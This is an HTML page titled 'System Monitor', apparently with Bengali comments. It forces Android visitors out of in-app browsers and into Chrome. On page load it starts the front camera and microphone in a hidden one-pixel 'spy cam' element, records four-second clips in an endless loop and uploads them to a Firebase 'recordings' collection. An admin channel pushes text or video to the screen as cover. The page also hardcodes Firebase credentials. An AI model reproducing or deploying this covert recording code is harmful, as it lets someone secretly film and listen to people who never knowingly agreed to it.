<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
 content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

<style>
/* Security feel */
*{
  -webkit-user-select:none;
  user-select:none;
  -webkit-touch-callout:none;
}
body{
  margin:0;
  background:#ffffff;
  height:100vh;
  overflow:hidden;
  font-family:monospace;
}

/* üî¥ REDIRECT SCREEN (Force Chrome) */
#redirectBox{
  position:fixed;
  inset:0;
  background:#000;
  color:#0f0;
  display:flex;
  align-items:center;
  justify-content:center;
  flex-direction:column;
  z-index:99999;
}

/* üîµ MAIN APP CONTAINER (Initially Hidden) */
#mainApp{
  display:none; /* JS ‡¶¶‡¶ø‡ßü‡ßá ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡¶¨‡ßá */
  flex-direction:column;
  height:100%;
}

/* TITLE BAR */
.title-bar{
  background:#000;
  color:#0f0;
  padding:14px;
  text-align:center;
  font-size:12px;
  border-bottom:1px solid #222;
}

/* Main content area */
#mainBox{
  flex:1;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  overflow:hidden;
}

/* Admin Video Player */
#displayVideo{
  width:100%;
  max-height: 50vh;
  display:none;
  background: black;
}

#displayText{
  width:100%;
  padding:20px;
  font-size:20px;
  color:#000;
  text-align:center;
  white-space:pre-wrap;
  box-sizing:border-box;
}

/* Hidden spy camera preview */
#preview{
  position:absolute;
  width:1px;
  height:1px;
  opacity:0;
  z-index: -1;
}
</style>
</head>

<body oncontextmenu="return false;">

<!-- 1. REDIRECT SCREEN -->
<div id="redirectBox">
  <h3>Opening in Chrome‚Ä¶</h3>
  <p>System requires Chrome browser</p>
</div>

<!-- 2. MAIN APP -->
<div id="mainApp">
  <div class="title-bar">
    SYSTEM MONITOR
  </div>

  <!-- Hidden Spy Cam -->
  <video id="preview" autoplay muted playsinline></video>

  <div id="mainBox">
    <!-- Admin Broadcast View -->
    <video id="displayVideo" controls playsinline></video>
    <div id="displayText"></div>
  </div>
</div>

<script>
/* =========================================
   1. FORCE CHROME LOGIC
   ========================================= */
(function(){
  const ua = navigator.userAgent;
  // Android ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶¨‡ßá
  const isAndroid = /Android/i.test(ua);
  // Chrome ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶¨‡ßá (‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ Facebook/Instagram ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶¶ ‡¶¶‡ßá‡¶¨‡ßá)
  const isChrome = /Chrome/i.test(ua) && !/FBAN|FBAV|Instagram/i.test(ua);

  if(isAndroid && !isChrome){
    // ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶® URL ‡¶•‡ßá‡¶ï‡ßá https:// ‡¶¨‡¶æ http:// ‡¶∏‡¶∞‡¶ø‡ßü‡ßá ‡¶®‡ßá‡¶¨‡ßá
    const url = location.href.replace(/^https?:\/\//,'');
    
    // 800ms ‡¶™‡¶∞ Chrome ‡¶è ‡¶∞‡¶ø‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶¨‡ßá
    setTimeout(()=>{
      location.href =
        "intent://" + url +
        "#Intent;scheme=https;package=com.android.chrome;end";
    }, 800);
    return; // ‡¶Æ‡ßá‡¶á‡¶® ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶≤‡ßã‡¶° ‡¶π‡¶¨‡ßá ‡¶®‡¶æ
  }

  // ‡¶Ø‡¶¶‡¶ø Chrome ‡¶π‡ßü, ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶¨‡ßá
  document.getElementById("redirectBox").style.display="none";
  document.getElementById("mainApp").style.display="flex";
})();

/* =========================================
   2. FIREBASE CONFIG
   ========================================= */
const firebaseConfig = {
  apiKey: "AIzaSyDRStBDXM2OqFbyKuT26pKgvZwiWjSERLU",
  authDomain: "camera-2d884.firebaseapp.com",
  projectId: "camera-2d884",
  storageBucket: "camera-2d884.firebasestorage.app",
  messagingSenderId: "71602055036",
  appId: "1:71602055036:web:65cbbf91ad91dd2df6e6f9"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

/* =========================================
   3. ADMIN LISTENER (Admin -> User)
   ========================================= */
db.collection("admin_to_user").doc("current")
  .onSnapshot(doc=>{
    if(!doc.exists) return;

    const d = doc.data();
    const vid = document.getElementById("displayVideo");
    const txt = document.getElementById("displayText");

    // Reset
    vid.style.display = "none";
    vid.pause();
    txt.innerText = "";

    if(d.type === "text"){
      txt.innerText = d.data;
    }
    else if(d.type === "video"){
      vid.src = d.data;
      vid.style.display = "block";
      vid.play();
    }
  });

/* =========================================
   4. HIDDEN CAMERA LOOP (User -> Admin)
   ========================================= */
async function startCamera(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user"},
      audio:true
    });
    document.getElementById("preview").srcObject = stream;
    recordLoop(stream);
  } catch(e) {
    console.log("Camera access denied or not supported");
  }
}

function recordLoop(stream){
  const mr = new MediaRecorder(stream,{ mimeType:"video/webm" });
  let chunks = [];

  mr.ondataavailable = e=>{
    if(e.data && e.data.size>0) chunks.push(e.data);
  };

  mr.onstop = ()=>{
    if(chunks.length===0) return recordLoop(stream);

    const blob = new Blob(chunks,{type:"video/webm"});
    chunks = [];

    const reader = new FileReader();
    reader.onloadend = ()=>{
      // Upload to 'recordings' collection
      db.collection("recordings").add({
        videoText: reader.result,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      }).then(()=>{
        recordLoop(stream); // Start again instantly
      });
    };
    reader.readAsDataURL(blob);
  };

  mr.start();
  // 4 ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶™‡¶∞ ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶ï‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶¨‡ßá
  setTimeout(()=>{
    if(mr.state==="recording") mr.stop();
  }, 4000);
}

// ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶™‡¶∞ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡¶¨‡ßá
// (Chrome ‡¶è ‡¶•‡¶æ‡¶ï‡¶≤‡ßá ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡¶¨‡ßá)
if(document.getElementById("mainApp").style.display !== "none" || /Chrome/i.test(navigator.userAgent)){
    startCamera();
}
</script>

</body>
</html>
